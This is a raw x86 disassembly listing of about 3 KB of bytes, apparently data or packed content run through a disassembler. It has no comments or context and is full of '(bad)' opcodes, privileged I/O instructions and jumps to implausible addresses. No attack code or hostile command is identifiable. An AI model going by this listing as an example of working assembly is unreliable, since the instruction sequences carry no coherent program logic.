  412ab2:	and    ebp,DWORD PTR [esi]
  412ab4:	test   DWORD PTR [eax],ebx
  412ab6:	fsub   QWORD PTR [ebp-0x26]
  412ab9:	add    eax,0x6f2c4375
  412abe:	jg     0x412aa9
  412ac0:	mov    ds:0x20dadaa3,eax
  412ac5:	jl     0x412ac4
  412ac7:	sub    bl,dh
  412ac9:	lods   eax,DWORD PTR ds:[esi]
  412aca:	xchg   DWORD PTR [eax+ebp*2+0x75],eax
  412ace:	push   ebp
  412acf:	adc    ch,BYTE PTR [esi-0x642613f3]
  412ad5:	scas   eax,DWORD PTR es:[edi]
  412ad6:	add    eax,0xfde7ad5b
  412adb:	adc    al,0x58
  412add:	inc    ecx
  412ade:	jg     0x412a9b
  412ae0:	adc    eax,0xa2c78748
  412ae5:	out    dx,al
  412ae6:	mov    edi,edx
  412ae8:	cmp    al,0x1
  412aea:	mov    ebp,0x2649c93a
  412aef:	jecxz  0x412b63
  412af1:	pusha  
  412af2:	lock or eax,0x2fdbffa6
  412af8:	mov    bh,0x2f
  412afa:	adc    dh,dl
  412afc:	dec    eax
  412afd:	pop    edx
  412afe:	sub    BYTE PTR [ebx-0xd90a4d],0x5
  412b05:	call   0x599a8837
  412b0a:	into   
  412b0b:	(bad)  
  412b0c:	(bad)  
  412b0d:	(bad)  
  412b0e:	stc    
  412b0f:	rcl    BYTE PTR [esi+0x56],0x6a
  412b13:	dec    eax
  412b14:	jb     0x412b75
  412b16:	push   ss
  412b17:	inc    edx
  412b18:	stos   BYTE PTR es:[edi],al
  412b19:	lods   eax,DWORD PTR ds:[esi]
  412b1a:	mov    edx,0x38e4032
  412b1f:	imul   edx,esp,0x7b
  412b22:	inc    ecx
  412b23:	xchg   ecx,eax
  412b24:	fiadd  DWORD PTR [eax]
  412b26:	or     esp,DWORD PTR [esi+0x6e]
  412b29:	xor    eax,0x2d9e134b
  412b2e:	out    0x4f,eax
  412b30:	mov    al,0x44
  412b32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b33:	sbb    al,0x6
  412b35:	mov    ah,BYTE PTR [ecx]
  412b37:	jae    0x412b97
  412b39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b3a:	xor    ecx,ebx
  412b3c:	mov    ah,0x24
  412b3e:	jle    0x412afc
  412b40:	mov    esi,0x5d50289b
  412b45:	call   0x8147:0xe9b9f0a1
  412b4c:	shl    BYTE PTR [ebx-0x29],cl
  412b4f:	and    DWORD PTR [edi-0x10],edx
  412b52:	xchg   BYTE PTR [eax],dh
  412b54:	xchg   DWORD PTR [ebx+0x3639489e],ecx
  412b5a:	imul   edi,DWORD PTR [edi+0x77d131be],0x4c
  412b61:	jg     0x412af6
  412b63:	hlt    
  412b64:	pusha  
  412b65:	mov    eax,0x99f109c
  412b6a:	cmp    eax,esi
  412b6c:	lea    ebp,[ecx-0x6d]
  412b6f:	xlat   BYTE PTR ds:[ebx]
  412b70:	adc    edi,DWORD PTR [eax]
  412b72:	mov    esp,0x49effc13
  412b77:	mov    ah,0x57
  412b79:	leave  
  412b7a:	in     al,dx
  412b7b:	push   0xffffffc4
  412b7d:	inc    edi
  412b7e:	popf   
  412b7f:	stos   DWORD PTR es:[edi],eax
  412b80:	jle    0x412b4f
  412b82:	fstp   QWORD PTR [edi]
  412b84:	jmp    0x82fd:0x2b5fd0a6
  412b8b:	inc    esi
  412b8c:	inc    edx
  412b8d:	and    eax,0x1245e259
  412b92:	into   
  412b93:	scas   al,BYTE PTR es:[edi]
  412b94:	test   cl,ah
  412b96:	pop    ss
  412b97:	int    0x72
  412b99:	or     DWORD PTR [ebx-0x7ec314fb],ebp
  412b9f:	lahf   
  412ba0:	or     dl,al
  412ba2:	imul   esi,DWORD PTR [ecx+0x1b],0xea7d3e9d
  412ba9:	mov    ch,0x1d
  412bab:	cmp    ah,cl
  412bad:	fs in  eax,0xde
  412bb0:	pop    eax
  412bb1:	cmp    esp,DWORD PTR [ebp-0x1f]
  412bb4:	cdq    
  412bb5:	or     DWORD PTR [esi+0x21ac44f3],ecx
  412bbb:	ds ja  0x412be7
  412bbe:	repz int 0xc0
  412bc1:	push   ds
  412bc2:	mov    ecx,0x4cb5b570
  412bc7:	and    bh,BYTE PTR [edx+0x18]
  412bca:	xor    eax,DWORD PTR [eax+esi*1-0x6b]
  412bce:	ret    0xe633
  412bd1:	out    0x34,eax
  412bd3:	inc    ebx
  412bd4:	push   edx
  412bd5:	mov    ebx,0xde24b809
  412bda:	sbb    edx,DWORD PTR [eax-0x7fe7e914]
  412be0:	sbb    al,0x78
  412be2:	adc    esi,DWORD PTR [eax+eiz*4]
  412be5:	push   0xffffffc3
  412be7:	mov    DWORD PTR [edx],edx
  412be9:	outs   dx,DWORD PTR ds:[esi]
  412bea:	(bad)
  412bee:	push   eax
  412bef:	jg     0x412bbc
  412bf1:	push   edi
  412bf2:	into   
  412bf3:	cwde   
  412bf4:	repnz cmp BYTE PTR [edx+ecx*4+0x1d77d224],ch
  412bfc:	ror    BYTE PTR [esi+eiz*2-0x7a],cl
  412c00:	fld    TBYTE PTR [esi+0x63]
  412c03:	pop    ebx
  412c04:	push   cs
  412c05:	pop    ebx
  412c06:	retf   
  412c07:	adc    al,0x17
  412c09:	adc    ebp,DWORD PTR [ebp+0x33]
  412c0c:	loope  0x412c7f
  412c0e:	pop    ecx
  412c0f:	mov    ch,0x10
  412c11:	out    dx,eax
  412c12:	push   edx
  412c13:	mov    ds:0x9f5af522,eax
  412c18:	mov    ah,0x87
  412c1a:	mov    ds:0x86641f54,al
  412c1f:	or     al,0x6f
  412c21:	jmp    0x10e1:0xaaf669fb
  412c28:	(bad)  
  412c29:	xchg   ecx,eax
  412c2a:	pop    es
  412c2b:	pop    ds
  412c2c:	repz mov ds:0x905c17f5,al
  412c32:	rol    DWORD PTR [ebx+0x6e36eb11],0xe2
  412c39:	fcomp  st(4)
  412c3b:	and    dl,BYTE PTR cs:[ebp+0x65]
  412c3f:	xchg   esp,ecx
  412c41:	or     dh,BYTE PTR [edi]
  412c43:	fsub   DWORD PTR [eax+ebx*2-0x6a03fdd1]
  412c4a:	(bad)  
  412c4b:	xchg   ebp,eax
  412c4c:	or     esp,ebx
  412c4e:	dec    ebx
  412c4f:	aaa    
  412c50:	(bad)  
  412c51:	shl    BYTE PTR [ecx],0xad
  412c54:	xchg   esp,eax
  412c55:	fst    QWORD PTR [esi+0x24]
  412c58:	out    0x3d,eax
  412c5a:	repz test DWORD PTR [esi+edx*1-0x75b97c43],ebp
  412c62:	xor    al,0x5a
  412c64:	das    
  412c65:	xchg   esi,eax
  412c66:	fistp  DWORD PTR [ebx+0x64921ba1]
  412c6c:	or     BYTE PTR [ecx-0x2565d170],dh
  412c72:	int    0xbd
  412c74:	lods   al,BYTE PTR ds:[esi]
  412c75:	sub    eax,0xf2b88529
  412c7a:	mov    ds,WORD PTR [edi+0xa09b79a]
  412c80:	jno    0x412c1c
  412c82:	sub    DWORD PTR [eax],ebp
  412c84:	(bad)  
  412c85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c86:	aam    0x3e
  412c88:	pop    esi
  412c89:	int    0x5
  412c8b:	(bad)  
  412c8c:	outs   dx,DWORD PTR ds:[esi]
  412c8d:	or     ecx,DWORD PTR [ebp+0x44dccb8d]
  412c93:	mov    esi,0x631c0025
  412c98:	nop
  412c99:	xor    al,0x68
  412c9b:	pop    esi
  412c9c:	jle    0x412c6d
  412c9e:	out    0xec,eax
  412ca0:	mov    edx,0x7e64a668
  412ca5:	push   ebp
  412ca6:	imul   DWORD PTR [eax]
  412ca8:	ins    BYTE PTR es:[edi],dx
  412ca9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412caa:	jmp    ecx
  412cac:	inc    ecx
  412cad:	stos   BYTE PTR es:[edi],al
  412cae:	repz mov eax,ds:0x142b455c
  412cb4:	pop    eax
  412cb5:	cli    
  412cb6:	mov    esi,0x1110fd5d
  412cbb:	rcr    edx,cl
  412cbd:	repz rol ah,1
  412cc0:	ror    DWORD PTR [esi+0x25],1
  412cc3:	pop    edx
  412cc4:	dec    edi
  412cc5:	cmp    al,0x6e
  412cc7:	aad    0x54
  412cc9:	loope  0x412c5f
  412ccb:	mov    WORD PTR [esi-0xb],fs
  412cce:	mov    ah,0x23
  412cd0:	das    
  412cd1:	fld    TBYTE PTR [ebx-0x4557146a]
  412cd7:	inc    edx
  412cd8:	jns    0x412d2b
  412cda:	lock aas 
  412cdc:	mov    edx,0x19a226a2
  412ce1:	or     eax,0xe34e603b
  412ce6:	jg     0x412d1e
  412ce8:	int3   
  412ce9:	cld    
  412cea:	in     eax,0x3d
  412cec:	jg     0x412c9a
  412cee:	xchg   DWORD PTR gs:[ecx-0x7fcf7e2c],ebx
  412cf5:	or     BYTE PTR [edi],cl
  412cf7:	jne    0x412d41
  412cf9:	outs   dx,BYTE PTR ds:[esi]
  412cfa:	push   edi
  412cfb:	(bad)  
  412cfc:	out    0x33,al
  412cfe:	out    dx,al
  412cff:	shl    DWORD PTR [ebx+0x23],0x58
  412d03:	arpl   WORD PTR [esi],bx
  412d05:	add    eax,0xb0c1674a
  412d0a:	add    ch,bh
  412d0c:	adc    esi,DWORD PTR [esi-0x7a]
  412d0f:	in     eax,dx
  412d10:	retfw  0xce53
  412d14:	test   al,0x27
  412d16:	dec    edi
  412d17:	push   ds
  412d18:	ret    
  412d19:	cdq    
  412d1a:	mov    eax,ds:0xb6e8d805
  412d1f:	dec    edx
  412d20:	and    BYTE PTR [ecx-0x653c933c],al
  412d26:	or     al,BYTE PTR [edx+0x78]
  412d29:	push   edx
  412d2a:	inc    ebx
  412d2c:	fwait
  412d2d:	lods   eax,DWORD PTR ds:[esi]
  412d2e:	jge    0x412d2a
  412d30:	mov    eax,0x735c61ba
  412d35:	cld    
  412d36:	(bad)  
  412d37:	and    ebp,DWORD PTR [eax+0x58f18fbd]
  412d3d:	mov    ecx,0x2e1e5129
  412d42:	mov    bl,0x6e
  412d44:	aad    0x9b
  412d46:	jmp    0x5085:0xb84c32b9
  412d4d:	pop    esp
  412d4e:	push   ebp
  412d4f:	inc    ebx
  412d50:	mov    ebp,0x6b8b6e4d
  412d55:	stos   BYTE PTR es:[edi],al
  412d56:	ins    BYTE PTR es:[edi],dx
  412d57:	fwait
  412d58:	adc    DWORD PTR [eax],esi
  412d5a:	jecxz  0x412d37
  412d5c:	loopne 0x412dcf
  412d5e:	sub    al,0x4d
  412d60:	push   0x30
  412d62:	pop    ss
  412d63:	es in  eax,dx
  412d65:	stos   BYTE PTR es:[edi],al
  412d66:	sub    al,0xaf
  412d68:	dec    ebx
  412d69:	cmp    al,0x87
  412d6b:	inc    ecx
  412d6c:	dec    esp
  412d6d:	daa    
  412d6e:	xchg   esp,eax
  412d6f:	ins    DWORD PTR es:[edi],dx
  412d70:	daa    
  412d71:	js     0x412ddb
  412d73:	xor    BYTE PTR [edi+edi*2+0x42],ah
  412d77:	stos   BYTE PTR es:[edi],al
  412d78:	xchg   edi,eax
  412d79:	clc    
  412d7a:	jae    0x412dc0
  412d7c:	test   al,0x89
  412d7e:	mov    dl,0xd
  412d80:	push   ebx
  412d81:	int3   
  412d82:	js     0x412da8
  412d84:	sub    al,0x29
  412d86:	inc    eax
  412d87:	sbb    eax,0xe98c1f41
  412d8c:	shr    BYTE PTR [edi-0x7c],1
  412d8f:	mov    bl,BYTE PTR [edi]
  412d91:	lock imul ebx,DWORD PTR [ebp+0x1444b4c3],0xffffffe9
  412d99:	jmp    0xd2885761
  412d9e:	pusha  
  412d9f:	inc    edi
  412da0:	aas    
  412da1:	ror    DWORD PTR [ebx+0x396daef2],0x48
  412da8:	dec    ecx
  412da9:	cmp    dh,ch
  412dab:	sbb    DWORD PTR [edx],0x20
  412dae:	jb     0x412d3b
  412db0:	es pop ss
  412db2:	data16 gs das 
  412db5:	jle    0x412de4
  412db7:	shr    BYTE PTR [edi],1
  412db9:	push   esi
  412dba:	jmp    0x412d80
  412dbc:	aam    0x62
  412dbe:	pushf  
  412dbf:	dec    eax
  412dc0:	(bad)  
  412dc1:	in     eax,dx
  412dc2:	sahf   
  412dc3:	sub    BYTE PTR [eax+0x6b],0xd3
  412dc7:	fst    DWORD PTR [edx]
  412dc9:	mov    ah,0xe5
  412dcb:	dec    edi
  412dcc:	rcr    DWORD PTR [eax],1
  412dce:	aad    0x67
  412dd0:	mov    ah,0x88
  412dd2:	enter  0xe402,0xc2
  412dd6:	out    0xef,al
  412dd8:	push   es
  412dd9:	xlat   BYTE PTR ds:[ebx]
  412dda:	pop    esi
  412ddb:	gs mov al,0xa5
  412dde:	ins    DWORD PTR es:[edi],dx
  412ddf:	sbb    al,0xa
  412de1:	sub    DWORD PTR [edi+0x27],edi
  412de4:	or     bh,dh
  412de6:	fwait
  412de7:	ja     0x412dc4
  412de9:	mov    ds:0x67d9e141,al
  412dee:	dec    edx
  412def:	cmc    
  412df0:	iret   
  412df1:	aaa    
  412df2:	mov    eax,0x54e8d329
  412df7:	into   
  412df8:	js     0x412d9b
  412dfa:	aas    
  412dfb:	inc    edi
  412dfc:	jns    0x412e7d
  412dfe:	cmc    
  412dff:	(bad)  
  412e00:	shl    BYTE PTR [esi-0x2a2756e1],1
  412e06:	out    0xa6,eax
  412e08:	jno    0x412e21
  412e0a:	js     0x412e86
  412e0c:	inc    ebx
  412e0d:	and    BYTE PTR [ebp-0x43],cl
  412e10:	call   0xe38a0c8f
  412e15:	mov    esp,0x79b18960
  412e1a:	xchg   ah,al
  412e1c:	pop    edi
  412e1d:	mov    dh,0x3c
  412e1f:	ret    
  412e20:	jno    0x412de6
  412e22:	outs   dx,BYTE PTR ds:[esi]
  412e23:	jle    0x412de4
  412e25:	dec    esp
  412e26:	pop    eax
  412e28:	jecxz  0x412dd2
  412e2a:	shr    BYTE PTR [eax-0x5dcfeca5],cl
  412e30:	aaa    
  412e31:	icebp  
  412e32:	cwde   
  412e33:	je     0x412e15
  412e35:	jnp    0x412de1
  412e37:	jl     0x412dd8
  412e39:	push   ds
  412e3a:	retf   
  412e3b:	int    0x64
  412e3d:	outs   dx,BYTE PTR ds:[esi]
  412e3e:	dec    esi
  412e3f:	add    dh,ah
  412e41:	int3   
  412e42:	and    DWORD PTR [edi+0x2f4ae2ae],0x2d312caf
  412e4c:	ret    0x80f7
  412e4f:	jb     0x412dea
  412e51:	sub    BYTE PTR [edi],0x65
  412e54:	xchg   esi,eax
  412e55:	vshufps xmm3,xmm0,XMMWORD PTR [ebx-0x21],0xc9
  412e5b:	aaa    
  412e5c:	shl    esp,cl
  412e5e:	mov    edi,0x2a8a14d0
  412e63:	in     al,0xaf
  412e65:	dec    esi
  412e66:	and    BYTE PTR [edx],ah
  412e68:	das    
  412e69:	push   eax
  412e6a:	lds    eax,FWORD PTR [ebx]
  412e6c:	sub    al,0x98
  412e6e:	retf   
  412e6f:	jae    0x412e75
  412e71:	loope  0x412ea3
  412e73:	push   esi
  412e74:	push   cs
  412e75:	sbb    dl,bh
  412e77:	pop    ds
  412e78:	cmp    BYTE PTR [eax],ah
  412e7a:	mov    eax,DWORD PTR [edx+0x50]
  412e7d:	les    ebp,FWORD PTR [ebp-0x29a9a357]
  412e83:	fs push esi
  412e85:	(bad)  
  412e86:	out    dx,eax
  412e87:	sti    
  412e88:	pop    ebx
  412e89:	cld    
  412e8a:	cmp    BYTE PTR ds:0xdee78d67,ch
  412e90:	inc    eax
  412e91:	gs cbw 
  412e94:	dec    edi
  412e95:	push   ds
  412e96:	sbb    eax,0xffffffa7
  412e99:	pop    eax
  412e9a:	pusha  
  412e9b:	and    dh,BYTE PTR [eax-0x9fa7844]
  412ea1:	xchg   DWORD PTR [ecx-0x52],edx
  412ea4:	sti    
  412ea5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ea6:	sub    BYTE PTR [ebx+ebx*1],0xda
  412eaa:	aaa    
  412eab:	in     eax,0x40
  412ead:	(bad)  
  412eae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412eaf:	jmp    FWORD PTR [ecx-0x2594f1db]
  412eb5:	loopne 0x412e56
  412eb7:	arpl   WORD PTR [ebx-0x2f],bp
  412eba:	jmp    0x412e76
  412ebc:	stos   DWORD PTR es:[edi],eax
  412ebd:	popa   
  412ebe:	push   eax
  412ebf:	xchg   esp,eax
  412ec0:	push   0xffffffa2
  412ec2:	push   ds
  412ec3:	ds mov esp,0x42216a16
  412ec9:	ins    DWORD PTR es:[edi],dx
  412eca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ecb:	add    eax,0xe0562d0e
  412ed0:	mov    ss,WORD PTR [edx+0x58]
  412ed3:	sbb    al,0x69
  412ed5:	sub    DWORD PTR [ecx+0x3a],ecx
  412ed8:	pop    esp
  412ed9:	fwait
  412eda:	test   al,0xad
  412edc:	lock leave 
  412ede:	gs jmp 0x412f08
  412ee1:	mul    DWORD PTR [esi+eiz*8-0x1a236d7]
  412ee8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ee9:	lahf   
  412eea:	addr16 push ebx
  412eec:	(bad)  
  412eed:	xchg   esp,eax
  412eee:	xchg   edx,eax
  412eef:	pop    edx
  412ef0:	push   es
  412ef1:	jbe    0x412f33
  412ef3:	push   0xffffff91
  412ef5:	sub    BYTE PTR [eax+0x4bedefbc],bl
  412efb:	bound  ebp,QWORD PTR [eax-0x1e45a5a4]
  412f01:	arpl   WORD PTR [ebx+0x2c7d3f50],dx
  412f07:	sbb    edx,DWORD PTR [edi]
  412f09:	add    ch,bh
  412f0b:	jg     0x412f21
  412f0d:	inc    esi
  412f0e:	outs   dx,BYTE PTR ds:[esi]
  412f0f:	dec    esi
  412f10:	mov    cl,0x99
  412f12:	mov    al,0x7a
  412f14:	sub    eax,0x8aa1d8c7
  412f19:	or     DWORD PTR [esi-0x76ef6f2c],esp
  412f1f:	mov    WORD PTR [ebx-0xaca8e61],?
  412f25:	inc    ebp
  412f26:	mov    al,ds:0x897f92a3
  412f2b:	pop    edx
  412f2c:	fucomp st(0)
  412f2e:	into   
  412f2f:	sub    DWORD PTR [edx+0x31],ebp
  412f32:	cli    
  412f33:	imul   edi,DWORD PTR [edx],0x45b25fee
  412f39:	lods   eax,DWORD PTR ds:[esi]
  412f3a:	add    eax,0xd53c4a20
  412f3f:	ds jecxz 0x412f1d
  412f42:	push   edx
  412f43:	bound  ecx,QWORD PTR [esp+esi*8-0x7b2f4ad3]
  412f4a:	jo     0x412f85
  412f4c:	pop    eax
  412f4d:	pop    ebx
  412f4e:	and    ebx,DWORD PTR [edx]
  412f50:	shl    DWORD PTR [eiz*1-0x35f24554],1
  412f57:	cmp    ecx,DWORD PTR [edx+0x69]
  412f5a:	xchg   edx,eax
  412f5b:	lods   eax,DWORD PTR ds:[esi]
  412f5c:	adc    DWORD PTR [edx-0x31a12879],0x9be394cd
  412f66:	fwait
  412f67:	and    DWORD PTR [ebp+0x1a],ecx
  412f6a:	pop    esp
  412f6b:	mov    esp,0xce7c7544
  412f70:	sub    eax,0x62b8ac67
  412f75:	retf   0xfefc
  412f78:	and    esi,DWORD PTR [eax+edi*2-0xbadf12e]
  412f7f:	pop    es
  412f80:	add    ecx,DWORD PTR [edi]
  412f82:	shl    cl,cl
  412f84:	daa    
  412f85:	loop   0x412fa1
  412f87:	push   edx
  412f88:	or     dl,BYTE PTR [ebx+0x60]
  412f8b:	add    al,0x48
  412f8d:	pusha  
  412f8e:	mov    BYTE PTR [ecx+esi*4+0x63],dl
  412f92:	(bad)  
  412f93:	in     al,0x14
  412f95:	jle    0x412fa7
  412f97:	dec    ebp
  412f98:	jbe    0x412f20
  412f9a:	loop   0x412fba
  412f9c:	mov    esp,0xbd476185
  412fa1:	sbb    BYTE PTR [ebp+ecx*8-0x55],al
  412fa5:	sar    al,1
  412fa7:	sbb    al,0x75
  412fa9:	loopne 0x412ff6
  412fab:	imul   BYTE PTR [edi+0x7e]
  412fae:	jg     0x413006
  412fb0:	ficom  DWORD PTR [ecx+0x5e]
  412fb3:	outs   dx,BYTE PTR ds:[esi]
  412fb4:	pusha  
  412fb5:	int3   
  412fb6:	push   0xffffffe9
  412fb8:	add    dl,al
  412fba:	shl    ecx,cl
  412fbc:	out    0xd8,eax
  412fbe:	jae    0x412fc8
  412fc0:	imul   ebp,DWORD PTR [eax],0xfc064b72
  412fc6:	ror    ch,1
  412fc8:	pop    eax
  412fc9:	add    edi,DWORD PTR [eax-0x45]
  412fcc:	into   
  412fcd:	or     eax,0x38226f2c
  412fd2:	xor    al,0xd8
  412fd4:	adc    ch,dh
  412fd6:	and    bh,cl
  412fd8:	mov    edx,0xe51c5883
  412fdd:	bswap  eax
  412fdf:	sub    dh,BYTE PTR [esi+ebx*8-0x11107799]
  412fe6:	es adc ch,bl
  412fe9:	adc    edi,DWORD PTR [esi-0x64]
  412fec:	fnstsw WORD PTR [edx]
  412fee:	sub    ah,BYTE PTR [eax-0x17de261]
  412ff4:	add    edx,DWORD PTR [ecx+0x15c3be09]
  412ffa:	pop    ebp
  412ffb:	aaa    
  412ffc:	fs dec ebp
  412ffe:	cld    
  412fff:	(bad)  
  413002:	cmp    BYTE PTR [ebp+edi*4-0x57],bl
  413006:	out    0xd9,al
  413008:	mov    dl,0xf3
  41300a:	fld    DWORD PTR [edx]
  41300c:	adc    DWORD PTR [esi],0x81f0d652
  413012:	test   eax,0x1b6fa3a5
  413017:	loope  0x41308e
  413019:	ret    0x3f90
  41301c:	fild   WORD PTR [ecx+0x56516562]
  413022:	icebp  
  413023:	aam    0x29
  413025:	cld    
  413026:	push   ss
  413027:	sub    eax,0x9e6d3b62
  41302c:	or     al,0x80
  41302e:	fidiv  DWORD PTR ds:0xb89ea5fb
  413034:	test   BYTE PTR [ebx-0x6d],bh
  413037:	cmp    eax,0x7ba5c45c
  41303c:	or     BYTE PTR [eax],dh
  41303e:	pop    ecx
  41303f:	inc    esp
  413040:	out    0x65,al
  413042:	mov    edx,0x8032c185
  413047:	mov    BYTE PTR [ebx-0x28],ah
  41304a:	push   esp
  41304b:	lahf   
  41304c:	sub    bl,BYTE PTR [ebx-0xf775ac2]
  413052:	call   0x12f0:0xda7edb6d
  413059:	push   0x6f4f0cef
  41305e:	push   ebx
  41305f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413060:	fild   DWORD PTR [ecx+0x38d3eccd]
  413066:	sub    ecx,DWORD PTR [esi+0xf]
  413069:	dec    esp
  41306a:	jbe    0x413050
  41306c:	ficomp WORD PTR [ebx+0x2a]
  41306f:	ret    
  413070:	cmp    bh,BYTE PTR [ebx+ebx*2-0x40]
  413074:	adc    ch,BYTE PTR [esi-0x18922f2b]
  41307a:	adc    bl,dl
  41307c:	outs   dx,BYTE PTR ds:[esi]
  41307d:	inc    BYTE PTR ss:[ebp-0x50d29ed9]
  413084:	inc    edi
  413085:	jecxz  0x4130d5
  413087:	aad    0xa1
  413089:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41308a:	jg     0x4130a1
  41308c:	sbb    DWORD PTR [eax],edi
  41308e:	push   ebp
  41308f:	dec    ebx
  413090:	mov    esi,DWORD PTR [edx-0x504346f1]
  413096:	sub    eax,0x94261718
  41309b:	gs cld 
  41309d:	arpl   WORD PTR [eax-0x6c],cx
  4130a0:	adc    eax,0x27ad44f0
  4130a5:	inc    ebp
  4130a6:	outs   dx,DWORD PTR ds:[esi]
  4130a7:	add    al,0x94
  4130a9:	dec    esp
  4130aa:	sar    edi,0xd1
  4130ad:	jl     0x413117
  4130af:	sub    eax,0x5abd2e21
  4130b4:	je     0x4130b4
  4130b6:	mov    dh,0xbb
  4130b8:	xchg   edi,eax
  4130b9:	lea    edx,[ebx+0xdad115]
  4130bf:	in     eax,dx
  4130c0:	arpl   bp,bp
  4130c2:	imul   eax,DWORD PTR [eax-0x299a34f5],0x5b
  4130c9:	push   ebx
  4130ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130cb:	jnp    0x413055
  4130cd:	mov    al,ds:0x41b51551
  4130d2:	aas    
  4130d3:	mov    esp,0xa2529c7f
  4130d8:	(bad)  
  4130d9:	stos   BYTE PTR es:[edi],al
  4130da:	mov    DWORD PTR [ecx-0x1b],0x8b99e27a
  4130e1:	pop    ebp
  4130e2:	rcl    DWORD PTR [esi],0xf0
  4130e5:	je     0x41308d
  4130e7:	xchg   DWORD PTR [edi],ecx
  4130e9:	push   0x3c
  4130eb:	add    eax,DWORD PTR [ebx]
  4130ed:	push   edi
  4130ee:	dec    ebx
  4130ef:	sub    al,0x42
  4130f1:	jmp    0xf0a66b4c
  4130f6:	cmp    al,0x9
  4130f8:	fmul   DWORD PTR [edi-0x14]
  4130fb:	adc    DWORD PTR [edi+0xcc98c3c],0xa402f32
  413105:	dec    ebx
  413106:	cmp    eax,ebx
  413108:	aas    
  413109:	addr16 push esp
  41310b:	gs and al,0xfa
  41310e:	(bad)  
  41310f:	or     BYTE PTR [esp+edi*1-0x565c8474],bh
  413116:	mov    ebx,0x9ef9d9e
  41311b:	adc    dl,cl
  41311d:	outs   dx,BYTE PTR ds:[esi]
  41311e:	mov    ch,0x60
  413120:	sub    cl,BYTE PTR [ebp+ebp*8-0x4956c795]
  413127:	cdq    
  413128:	cmp    cl,dh
  41312a:	mov    dl,0x5d
  41312c:	pop    ecx
  41312d:	fadd   DWORD PTR [ecx-0x3e]
  413130:	test   DWORD PTR [eax+0x339841f6],ebp
  413136:	sub    DWORD PTR [ebp-0x20c67922],esp
  41313c:	xor    dh,ah
  41313e:	or     eax,0xa5888abf
  413143:	or     ebx,DWORD PTR [esi-0x3c]
  413146:	int    0x6b
  413148:	int3   
  413149:	sti    
  41314a:	outs   dx,DWORD PTR ds:[esi]
  41314b:	ret    
  41314c:	int    0x3c
  41314e:	jns    0x4130dc
  413150:	mov    al,0xbd
  413152:	mov    cl,0x43
  413154:	imul   esp,DWORD PTR [edi-0x30],0x4c
  413158:	sahf   
  413159:	xchg   edi,eax
  41315a:	jp     0x41318a
  41315c:	push   edi
  41315d:	dec    ebp
  41315e:	dec    esi
  41315f:	xor    DWORD PTR [eax-0x1e],edi
  413162:	dec    edx
  413163:	(bad)  
  413164:	call   FWORD PTR [eax]
  413166:	inc    edx
  413167:	rcr    DWORD PTR [edi],1
  413169:	inc    edx
  41316a:	call   0xcdf9:0xf223b22b
  413171:	mov    ?,WORD PTR [edi-0x62]
  413174:	sar    BYTE PTR [bp+si+0x5f],cl
  413178:	mov    cl,0xd8
  41317a:	mov    dl,0x6c
  41317c:	mov    WORD PTR [ebx],fs
  41317e:	push   esi
  41317f:	push   0xffffff92
  413181:	fnstcw WORD PTR [ebp-0x3e]
  413184:	push   cs
  413185:	sti    
  413186:	jae    0x4131fc
  413188:	mov    eax,0x10f7f70a
  41318d:	jp     0x41313d
  41318f:	int3   
  413190:	push   ss
  413191:	xchg   al,dl
  413193:	outs   dx,BYTE PTR ds:[esi]
  413194:	(bad)  
  413195:	mov    cl,0xf0
  413197:	in     eax,0xa1
  413199:	mov    bl,0x51
  41319b:	outs   dx,DWORD PTR ds:[esi]
  41319c:	dec    ecx
  41319d:	jmp    0x2722246e
  4131a2:	nop
  4131a3:	xchg   ebp,eax
  4131a4:	mov    ebx,0x94b7d9c7
  4131aa:	inc    esi
  4131ab:	xchg   edx,eax
  4131ac:	jnp    0x413134
  4131ae:	ss mov bh,0xfe
  4131b1:	div    DWORD PTR [edx+0x7e]
  4131b4:	inc    DWORD PTR [ebx]
  4131b6:	xor    bl,0x2d
  4131b9:	xchg   esi,eax
  4131ba:	xchg   ecx,eax
  4131bb:	mov    edx,0x6b07c86c
  4131c0:	lea    ebx,[ecx+0x636ae5cc]
  4131c6:	aam    0x48
  4131c8:	bnd jmp 0x50c346b7
  4131ce:	push   ss
  4131cf:	adc    al,0x8
  4131d1:	rcl    DWORD PTR [esi-0x8],cl
  4131d4:	jp     0x41320b
  4131d6:	mov    ah,0x85
  4131d8:	fbstp  TBYTE PTR [ebp+0x17]
  4131db:	ficom  WORD PTR [edi]
  4131dd:	adc    DWORD PTR gs:[eax],ebx
  4131e0:	adc    al,0x46
  4131e2:	js     0x413243
  4131e4:	sbb    BYTE PTR [edx-0x34],dl
  4131e7:	cmp    al,0xc5
  4131e9:	mov    eax,ds:0x6ca37648
  4131ee:	(bad)  
  4131f0:	(bad)  
  4131f1:	into   
  4131f2:	cs push edi
  4131f4:	mov    bh,0x86
  4131f6:	push   edx
  4131f7:	and    al,0xc4
  4131f9:	mov    bh,0x45
  4131fb:	or     eax,eax
  4131fd:	inc    ecx
  4131fe:	out    dx,eax
  4131ff:	cs add eax,0xb4bdc16d
  413205:	test   BYTE PTR [ebp-0x56580d99],bl
  41320b:	popa   
  41320c:	aas    
  41320d:	or     BYTE PTR [ebp-0x703f9d74],cl
  413213:	retf   
  413214:	adc    BYTE PTR [esi-0x6a],cl
  413217:	lea    ebx,[esi+0x29]
  41321a:	xlat   BYTE PTR ds:[ebx]
  41321b:	pop    ecx
  41321c:	pop    esp
  41321d:	pop    es
  41321e:	mov    BYTE PTR [edx-0x35],0x8f
  413222:	aaa    
  413223:	jg     0x41324e
  413225:	(bad)  
  413227:	imul   ebx,DWORD PTR [esp+edx*1-0x22],0xffffff8e
  41322c:	out    dx,al
  41322d:	outs   dx,DWORD PTR ds:[esi]
  41322e:	aas    
  41322f:	push   0x1634c03a
  413234:	int    0x5f
  413236:	ds jp  0x413267
  413239:	pop    ebx
  41323a:	jg     0x4131ff
  41323c:	mov    BYTE PTR [ecx+esi*4+0x270aa6f3],ah
  413243:	fadd   DWORD PTR [esi-0x61]
  413246:	rcl    dh,1
  413248:	hlt    
